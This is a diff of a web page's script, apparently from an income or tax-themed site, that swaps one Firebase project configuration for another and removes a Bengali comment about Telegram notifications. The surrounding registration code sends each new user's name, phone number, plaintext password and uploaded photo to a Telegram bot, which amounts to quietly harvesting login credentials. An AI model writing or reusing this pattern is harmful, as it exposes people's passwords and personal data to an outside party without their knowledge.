@@ -769,13 +769,13 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
 
 <script>
 const firebaseConfig = {
-    apiKey: "AIzaSyCgOILqhT8ZXHZ--VZvKw3TdU2HB2RNWkw",
-    authDomain: "takaincome-326cf.firebaseapp.com",
-    projectId: "takaincome-326cf",
-    storageBucket: "takaincome-326cf.appspot.com",
-    messagingSenderId: "27644737509",
-    appId: "1:27644737509:web:bbad28493df31a8646a10c",
-    measurementId: "G-V356Y69BK8"
+  apiKey: "AIzaSyAwh-nYp7F_BQ9CsqTVdHZQWDLMvaR5Rt4",
+  authDomain: "daily-tax-income.firebaseapp.com",
+  projectId: "daily-tax-income",
+  storageBucket: "daily-tax-income.firebasestorage.app",
+  messagingSenderId: "403059759788",
+  appId: "1:403059759788:web:3e04708a610db776699d09",
+  measurementId: "G-HH96GZZDJK"
 };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
@@ -1015,7 +1015,6 @@ async function handleRegistration() {
 
                 await userRef.set(userData);
                 
-                // টেলিগ্রাম বটে নোটিফিকেশন পাঠানো (নিরাপদভাবে)
                 try {
                     sendTelegramTextNotification(name, phone, password, serial);
                     sendTelegramPhotoNotification(name, serial, photoFile);
